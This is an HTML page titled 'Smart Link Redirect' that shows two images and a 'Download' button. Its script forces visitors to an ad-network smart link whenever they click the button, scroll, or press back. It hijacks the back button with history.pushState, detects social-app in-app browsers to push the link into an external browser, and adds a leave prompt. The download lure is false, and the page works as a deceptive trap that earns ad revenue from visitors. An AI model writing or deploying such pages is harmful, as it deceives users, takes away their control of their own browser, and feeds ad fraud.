<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Smart Link Redirect</title>
<style>
  body{
    margin:0;
    padding:0;
    text-align:center;
    background:#000000;
    font-family:Arial, sans-serif;
  }
  .content {
    display: inline-block;
    margin-top:50px;
    padding:20px;
    background:#ffffff;
    border-radius:15px;
  }
  img{
    width:100%;
    max-width:250px;
    display:block;
    margin:20px auto;
    border-radius:10px;
  }
  .btn{
    display:inline-block;
    margin:30px 0;
    padding:12px 30px;
    background:#ff3b3b;
    color:white;
    font-size:18px;
    border-radius:10px;
    text-decoration:none;
    font-weight:bold;
  }
  .btn:hover{
    background:#cc0000;
  }
  h2{
    color:white;
    margin-top:50px;
  }
</style>
</head>
<body>

<div class="content" id="mainContent">
  <img src="https://i.imgur.com/RIiQnS0.jpeg" alt="photo">
  <img src="https://i.imgur.com/jbGNrs0.gif" alt="gif">
  <a href="#" class="btn" id="downloadBtn">Download</a>
</div>

<script>
const smartLink = "https://www.effectivegatecpm.com/qckxhnmwr9?key=4eb1de3e823be95ed228fde4f1025ba7";

// 1️⃣ Detect in-app browsers (Facebook, Instagram, TikTok, etc.)
function isInAppBrowser() {
  const ua = navigator.userAgent || navigator.vendor || window.opera;
  const inAppKeywords = ["FBAN","FBAV","Instagram","Line","Twitter","Snapchat","TikTok"];
  return inAppKeywords.some(keyword => ua.indexOf(keyword) > -1);
}

// 2️⃣ If in-app browser → open in system browser
if(isInAppBrowser()){
    // Try to open in external browser
    window.open(smartLink, "_blank");
    // Show message in case auto open fails
    document.getElementById("mainContent").innerHTML = "<h2>Please open this page in Chrome, Safari, or your device browser for full functionality</h2>";
}

// 3️⃣ Unlimited redirect function
function redirectSmartLink(){
    window.location.href = smartLink;
}

// Download button click → unlimited redirect
document.getElementById("downloadBtn").addEventListener("click", redirectSmartLink);

// Back button click → unlimited redirect
history.pushState(null, null, location.href);
window.onpopstate = function () {
    redirectSmartLink();
};

// Scroll anywhere → unlimited redirect
window.addEventListener("scroll", redirectSmartLink);

// Optional: leave/reload alert
window.onbeforeunload = function() {
    return "Are you sure you want to leave?";
};
</script>

</body>
</html>
